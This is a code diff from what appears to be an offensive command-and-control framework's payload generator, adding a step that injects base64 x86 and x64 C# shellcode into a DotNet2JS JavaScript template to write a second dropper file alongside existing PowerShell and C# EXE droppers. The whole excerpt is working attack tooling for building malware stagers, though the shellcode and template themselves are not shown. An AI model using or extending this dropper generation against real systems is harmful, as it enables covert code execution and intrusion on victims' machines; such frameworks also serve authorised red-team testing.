@@ -366,23 +366,32 @@ ao.run('%s', 0);window.close();
         self.QuickstartLog("C# Powershell v2 EXE written to: %s%sdropper_cs_ps_v2.exe" % (self.BaseDirectory, name))
         subprocess.check_output(compileexe, shell=True)
         self.QuickstartLog("C# Powershell v4 EXE written to: %s%sdropper_cs_ps_v2.exe" % (self.BaseDirectory, name))
-        #add here
         with open("%sDotNet2JS.js" % FilesDirectory, 'r') as f:
             dotnet = f.read()        
         with open('%s%sPosh_v4_x64_Shellcode.b64' % (self.BaseDirectory, name), 'rb') as f:
             v4_64 = f.read()
         with open('%s%sPosh_v4_x86_Shellcode.b64' % (self.BaseDirectory, name), 'rb') as f:
             v4_86 = f.read()
-
         dotnet = dotnet.replace("#REPLACEME32#", v4_86.decode('utf-8'))  
-        dotnet = dotnet.replace("#REPLACEME64#", v4_64.decode('utf-8'))
-
-        self.QuickstartLog("DotNet2JS Payload written to: %s%sDotNet2JS.js" % (self.BaseDirectory, name))
+        dotnet = dotnet.replace("#REPLACEME64#", v4_64.decode('utf-8'))        
+        self.QuickstartLog("DotNet2JS Powershell Payload written to: %s%sDotNet2JS.js" % (self.BaseDirectory, name))
         filename = "%s%sDotNet2JS.js" % (self.BaseDirectory, name)
         output_file = open(filename, 'w')
         output_file.write(dotnet)
         output_file.close()  
-
+        with open("%sDotNet2JS.js" % FilesDirectory, 'r') as f:
+            dotnet = f.read()        
+        with open('%s%sSharp_v4_x64_Shellcode.b64' % (self.BaseDirectory, name), 'rb') as f:
+            v4_64 = f.read()
+        with open('%s%sSharp_v4_x86_Shellcode.b64' % (self.BaseDirectory, name), 'rb') as f:
+            v4_86 = f.read()
+        dotnet = dotnet.replace("#REPLACEME32#", v4_86.decode('utf-8'))  
+        dotnet = dotnet.replace("#REPLACEME64#", v4_64.decode('utf-8')) 
+        self.QuickstartLog("DotNet2JS C# Payload written to: %s%sDotNet2JS_CS.js" % (self.BaseDirectory, name))
+        filename = "%s%sDotNet2JS_CS.js" % (self.BaseDirectory, name)
+        output_file = open(filename, 'w')
+        output_file.write(dotnet)
+        output_file.close()  
 
     def CreatePython(self, name=""):
         self.QuickstartLog(Colours.END)
